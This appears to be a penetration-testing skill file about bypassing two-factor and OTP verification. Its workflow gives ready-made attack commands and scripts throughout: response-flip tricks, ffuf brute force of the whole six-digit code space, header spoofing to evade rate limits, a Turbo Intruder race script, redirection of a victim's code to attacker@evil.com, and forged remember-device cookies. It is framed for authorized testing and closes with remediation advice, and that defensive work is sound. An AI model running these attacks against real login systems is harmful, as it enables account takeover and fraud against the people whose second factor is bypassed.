---
name: bypassing-two-factor-and-otp
description: Identifying and exploiting flaws in two-factor authentication and one-time password verification
  including response manipulation, code leakage, brute force, race conditions, and delivery-target tampering.
domain: cybersecurity
subdomain: web-application-security
tags:
- penetration-testing
- two-factor-authentication
- otp
- mfa-bypass
- brute-force
- race-condition
- owasp
- web-security
version: '1.0'
author: Krishna Kumar (xalgord)
license: Apache-2.0
nist_csf:
- PR.PS-01
- ID.RA-01
- PR.DS-10
- DE.CM-01
---

# Bypassing Two-Factor and OTP

## When to Use

- During authorized penetration tests of any login, transaction, or step-up flow protected by a second factor
- When the application sends an SMS/email/TOTP code and asks the user to submit it for verification
- For validating that the second factor is enforced server-side, rate-limited, single-use, and tamper-resistant
- When testing "remember this device", backup codes, and account-recovery paths that can bypass 2FA
- During bug bounty programs targeting authentication bypass and broken MFA (OWASP A07:2021)

## Prerequisites

- **Authorization**: Written penetration testing agreement for the target application
- **Burp Suite Professional**: Proxy + Repeater + Intruder + Turbo Intruder (race/brute force)
- **One or two test accounts**: with a controllable phone/email to receive legitimate codes
- **Two endpoints to compare**: the 2FA verify request and its success/failure responses
- **curl / httpie**: For manual response and parameter tampering
- **ffuf / Turbo Intruder**: For high-rate brute force and single-packet race conditions

## Critical: Checks Most Often Missed

MFA is bypassed far more often through logic than cryptography. For every 2FA/OTP
flow, work through this checklist:

- **Response manipulation** (highest signal): submit a wrong code, intercept the
  response, and flip the result — change `403`->`200`, `{"success":false}`->`true`,
  `{"verified":false}`->`true`, or remove an `error` field. If the client advances
  to the logged-in state, verification is enforced client-side only.
- **Code leaked in the response**: inspect the JSON/HTML/headers of the
  "send OTP" response. The actual code, a hash of it, or the code in a debug field
  is a complete bypass with zero guessing.
- **Missing integrity / empty-code acceptance**: submit `null`, empty string,
  `000000`, `" "`, missing parameter, or boolean `true`. Servers that compare
  loosely or skip validation when the field is empty will accept it.
- **No brute-force protection**: the code space for 6 digits is only 1,000,000.
  Send thousands of guesses; if there is no lock/rate limit it is trivially
  brute forceable. Then test bypasses: rotate `X-Forwarded-For`, change
  `User-Agent`, append a null byte to the code, or use a fresh session per batch.
- **Race condition on verify**: fire many verify requests for the same/adjacent
  codes simultaneously (single-packet attack). Counters and lockouts checked
  before the increment can be outrun.
- **Code reuse / no expiry**: use a previously consumed code again, or a code
  long after issuance. Reusable or non-expiring codes defeat one-time semantics.
- **OTP delivery-target tampering**: change the `phone`/`email`/`user_id`
  parameter on the "send code" request so the code is delivered to an
  attacker-controlled destination while verifying against the victim account.
- **"Remember device" flaws**: capture the trust token/cookie; replay it on
  another account, tamper its contents, or check it is reusable cross-user.
- **Backup-code abuse**: backup/recovery codes that are short, sequential,
  un-rate-limited, or not invalidated after use.
- **Guessable / sequential OTP**: collect several real codes; if they increment,
  derive from timestamp, or have low entropy, predict the next one.

## Workflow

### Step 1: Map the 2FA Flow and Both Responses

Capture the send-code and verify-code requests and their exact success/failure shapes.

```bash
# 1) Trigger code delivery (note the destination parameters in the body)
curl -s -i -X POST "https://target.example.com/api/2fa/send" \
  -H "Content-Type: application/json" \
  -H "Cookie: SESSIONID=preauth..." \
  -d '{"user_id":1337,"channel":"sms","phone":"+15555550100"}'

# 2) Submit a WRONG code and record the failure response precisely
curl -s -i -X POST "https://target.example.com/api/2fa/verify" \
  -H "Content-Type: application/json" \
  -H "Cookie: SESSIONID=preauth..." \
  -d '{"user_id":1337,"code":"111111"}'
# Note: status (e.g. 401), body (e.g. {"success":false,"verified":false}),
#       and what the CORRECT response looks like (capture a real success once).
```

### Step 2: Response Manipulation (Status / JSON Boolean Flip)

Intercept the verify response and rewrite the result the client trusts.

```
# In Burp: Proxy > intercept the RESPONSE to /api/2fa/verify (right-click
# request in history > "Do intercept > Response to this request").

# Failure response (server):
#   HTTP/1.1 401 Unauthorized
#   {"success":false,"verified":false,"error":"invalid code"}

# Rewrite it before it reaches the browser:
#   HTTP/1.1 200 OK
#   {"success":true,"verified":true}

# If the SPA then loads the authenticated dashboard / sets an auth cookie,
# the 2FA gate is enforced client-side only => full bypass.
```

```bash
# Some apps gate the next step on a flag returned here. Also try tampering the
# status only, leaving the body, and vice versa — clients vary in what they read.
# Confirm impact by checking whether a privileged endpoint now works:
curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Cookie: SESSIONID=preauth..." \
  "https://target.example.com/api/account/me"   # 200 with data = bypassed
```

### Step 3: Code Leakage and Missing-Integrity Submissions

Look for the code in responses and test loose/empty validation.

```bash
# --- Leakage: inspect the send-code response and headers ---
curl -s -i -X POST "https://target.example.com/api/2fa/send" \
  -H "Content-Type: application/json" \
  -d '{"user_id":1337,"channel":"email"}'
# Look for: {"otp":"428193"}, {"debug":{"code":"428193"}}, hashed code,
#           or the code reflected in a Set-Cookie / custom header.

# --- Missing integrity: submit degenerate values ---
for code in '""' 'null' 'true' '"000000"' '" "' '"      "'; do
  echo "=== code=$code ==="
  curl -s -X POST "https://target.example.com/api/2fa/verify" \
    -H "Content-Type: application/json" \
    -H "Cookie: SESSIONID=preauth..." \
    -d "{\"user_id\":1337,\"code\":$code}"
  echo
done

# Also drop the field entirely (server may treat missing == valid/skip):
curl -s -X POST "https://target.example.com/api/2fa/verify" \
  -H "Content-Type: application/json" \
  -H "Cookie: SESSIONID=preauth..." \
  -d '{"user_id":1337}'
```

### Step 4: Brute Force and Rate-Limit Bypass

Exhaust the small code space and defeat naive throttling.

```bash
# 6-digit space = 000000..999999. Baseline brute force with ffuf:
ffuf -w <(seq -w 0 999999) \
  -u "https://target.example.com/api/2fa/verify" \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: SESSIONID=preauth..." \
  -d '{"user_id":1337,"code":"FUZZ"}' \
  -mc 200 -fr 'invalid code' -t 50 -rate 200

# If you hit a lockout/429, test bypasses one at a time:
# (a) rotate spoofed client IP each request
ffuf -w <(seq -w 0 999999) -u "https://target.example.com/api/2fa/verify" \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: SESSIONID=preauth..." \
  -H "X-Forwarded-For: 10.0.0.FUZZ2" \
  -d '{"user_id":1337,"code":"FUZZ"}' -mc 200

# (b) null byte / padding tricks that may reset the counter key
#     code values: "111111%00", "111111 ", "0111111", "+111111"
# (c) new pre-auth session every N attempts (re-run /login step, fresh cookie)
# (d) change User-Agent / add X-Real-IP, Client-IP, X-Originating-IP headers

# Spray-style alternative: fix one code, vary the account (codes are reused
# across many users within the validity window):
#   for each user_id in list: submit code "123456"
```

### Step 5: Race Condition on Verify

Outrun lockout/consumption logic with simultaneous requests.

```python
# Turbo Intruder (Burp) — single-packet style burst against /api/2fa/verify.
# Goal: many guesses land before the attempt counter / lockout is committed.
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           engine=Engine.BURP2)
    # Send 50 candidate codes in one synchronized burst
    for code in ['000000','111111','123456','428193','428194','428195']:
        req = target.req.replace('CODEHERE', code)
        engine.queue(req, gate='race1')
    engine.openGate('race1')

def handleResponse(req, interesting):
    if '200' in req.status or 'verified":true' in req.response:
        table.add(req)
```

```bash
# curl approximation: fire concurrent verifies of adjacent codes
for c in 428193 428194 428195 428196; do
  curl -s -X POST "https://target.example.com/api/2fa/verify" \
    -H "Content-Type: application/json" \
    -H "Cookie: SESSIONID=preauth..." \
    -d "{\"user_id\":1337,\"code\":\"$c\"}" &
done; wait
```

### Step 6: Reuse, Delivery Tampering, Remember-Device, and Backup Codes

Test single-use semantics, target redirection, and recovery bypasses.

```bash
# --- Code reuse / expiry ---
# Verify successfully with a real code, log out, then resubmit the SAME code:
curl -s -X POST "https://target.example.com/api/2fa/verify" \
  -H "Content-Type: application/json" -H "Cookie: SESSIONID=preauth2..." \
  -d '{"user_id":1337,"code":"428193"}'   # accepted again = reusable

# --- Delivery-target tampering (send victim's code to attacker) ---
# Authenticate the victim flow but point delivery at attacker contact:
curl -s -X POST "https://target.example.com/api/2fa/send" \
  -H "Content-Type: application/json" -H "Cookie: SESSIONID=victim-preauth..." \
  -d '{"user_id":1337,"phone":"+15555550199","email":"attacker@evil.com"}'
# Code arrives to attacker, then verify against the victim's account.

# --- Remember-device token abuse ---
# Capture the trust token after a "remember this device" success:
#   Set-Cookie: trusted_device=eyJ1c2VyIjoxMzM3fQ
echo "eyJ1c2VyIjoxMzM3fQ" | base64 -d        # {"user":1337}
# Tamper to another user and replay to skip 2FA:
NEW=$(echo -n '{"user":4242}' | base64)
curl -s -o /dev/null -w "%{http_code}\n" \
  -H "Cookie: SESSIONID=other-preauth...; trusted_device=$NEW" \
  "https://target.example.com/api/account/me"

# --- Backup-code abuse ---
# Brute force / reuse recovery codes (often shorter, sometimes sequential):
ffuf -w backup-codes.txt \
  -u "https://target.example.com/api/2fa/recovery" \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: SESSIONID=preauth..." \
  -d '{"user_id":1337,"backup_code":"FUZZ"}' -mc 200
```

## Key Concepts

| Concept | Description |
|---------|-------------|
| **Client-Side Enforcement** | App decides login success from a response field the client can rewrite |
| **Response Manipulation** | Editing status code or JSON booleans (`verified:false`->`true`) to fake success |
| **Code Leakage** | OTP exposed in the API response body, headers, or debug fields |
| **Missing Integrity Validation** | Server accepts null/empty/`000000`/missing code due to loose comparison |
| **Rate-Limit Bypass** | Defeating throttling via IP spoofing headers, UA change, null bytes, or fresh sessions |
| **Race Condition** | Concurrent verify requests outrun the attempt-counter/lockout commit |
| **One-Time Semantics** | A correct code must be single-use and expire quickly; reuse breaks it |
| **Delivery Tampering** | Changing phone/email/user_id so the code is sent to the attacker |
| **Remember-Device Token** | Persistent trust token that, if forgeable/reusable, skips 2FA entirely |
| **Backup Codes** | Recovery codes that bypass 2FA; weak if short, sequential, or un-rate-limited |

## Tools & Systems

| Tool | Purpose |
|------|---------|
| **Burp Suite Professional** | Intercept and rewrite responses, replay verify requests, fuzz with Intruder |
| **Turbo Intruder (Burp)** | Single-packet race conditions and very high-rate brute forcing |
| **ffuf** | Fast brute force of numeric OTP / backup-code spaces |
| **curl / httpie** | Manual response/parameter tampering and concurrency tests |
| **jwt_tool** | Decode/tamper remember-device tokens implemented as JWTs |
| **OWASP ZAP** | Free proxy alternative for response manipulation and fuzzing |

## Common Scenarios

### Scenario 1: Boolean Flip Bypass
The SPA calls `/api/2fa/verify` and reads `{"verified":true}` to render the dashboard. Intercepting the failure response and changing `false` to `true` advances the session because the server issues the auth cookie on the send step, not the verify step.

### Scenario 2: Unlimited OTP Guessing
The 6-digit SMS code has no attempt counter or rate limit. An automated run of up to 1,000,000 guesses (usually far fewer within the validity window) recovers the code and completes login.

### Scenario 3: Code Sent to Attacker
The send-code endpoint trusts a `phone` field from the request body. An attacker initiating the victim's login changes `phone` to their own number, receives the victim's OTP, and authenticates.

### Scenario 4: Reusable Remember-Device Cookie
A `trusted_device` cookie is an unsigned base64 blob containing the user ID. Editing the ID to another user lets the attacker skip 2FA on that account entirely.

## Output Format

```
## Two-Factor / OTP Finding

**Vulnerability**: MFA Bypass via Response Manipulation
**Severity**: Critical (CVSS 9.1)
**Location**: POST /api/2fa/verify (client-side enforcement)
**OWASP Category**: A07:2021 - Identification and Authentication Failures

### Reproduction Steps
1. Begin login as the victim and reach the 2FA prompt
2. Submit an arbitrary wrong code (e.g. 111111) to POST /api/2fa/verify
3. Intercept the response and change HTTP 401 / {"verified":false} to 200 / {"verified":true}
4. Observe the application loads the authenticated dashboard and issues an auth cookie

### Tested Weaknesses
| Test | Result |
|------|--------|
| Response status/boolean flip | Bypassed (logged in) |
| Empty/null/000000 code | Rejected |
| Brute force (no rate limit) | 1,000,000 max guesses, no lockout |
| Code reuse after success | Reusable within 10 min |
| Delivery-target tampering | phone param honored -> code to attacker |

### Impact
- Full authentication bypass without the second factor
- Unlimited guessing makes SMS OTP recoverable in minutes
- Code redirection enables remote account takeover of any user

### Recommendation
1. Enforce verification server-side; issue the authenticated session only after the server confirms the code
2. Add per-account and per-IP rate limiting plus lockout on the verify endpoint
3. Make codes single-use, short-lived (<=5 min), and high-entropy
4. Never return the code in responses; never trust client-supplied delivery targets
5. Sign and bind remember-device tokens to the user and device; invalidate backup codes on use
```
